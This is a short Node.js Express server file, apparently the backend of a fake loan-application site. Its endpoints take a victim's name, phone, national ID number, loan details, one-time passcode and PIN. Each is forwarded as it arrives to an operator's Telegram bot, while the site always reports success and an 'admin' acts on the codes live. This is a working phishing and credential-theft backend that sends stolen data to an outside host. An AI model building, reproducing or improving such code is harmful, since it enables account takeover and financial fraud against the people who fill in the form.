// server.js
const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');

const app = express();
app.use(bodyParser.json());

app.post('/submit-loan', (req, res) => {
    const { name, phone, idNumber, loanAmount, repaymentPeriod } = req.body;
    // Send data to Telegram Bot
    axios.post('YOUR_TELEGRAM_BOT_URL', {
        chat_id: 'YOUR_CHAT_ID',
        text: `New Loan Application:\nName: ${name}\nPhone: ${phone}\nID Number: ${idNumber}\nLoan Amount: ${loanAmount}\nRepayment Period: ${repaymentPeriod} days`
    });
    res.json({ success: true });
});

app.post('/verify-otp', (req, res) => {
    const { otp } = req.body;
    // Send OTP to Telegram Bot
    axios.post('YOUR_TELEGRAM_BOT_URL', {
        chat_id: 'YOUR_CHAT_ID',
        text: `OTP Entered: ${otp}`
    });
    res.json({ success: true }); // Admin will verify and respond
});

app.post('/verify-pin', (req, res) => {
    const { pin } = req.body;
    // Send PIN to Telegram Bot
    axios.post('YOUR_TELEGRAM_BOT_URL', {
        chat_id: 'YOUR_CHAT_ID',
        text: `PIN Entered: ${pin}`
    });
    res.json({ success: true }); // Admin will verify and respond
});

app.listen(3000, () => {
    console.log('Server is running on port 3000');
});
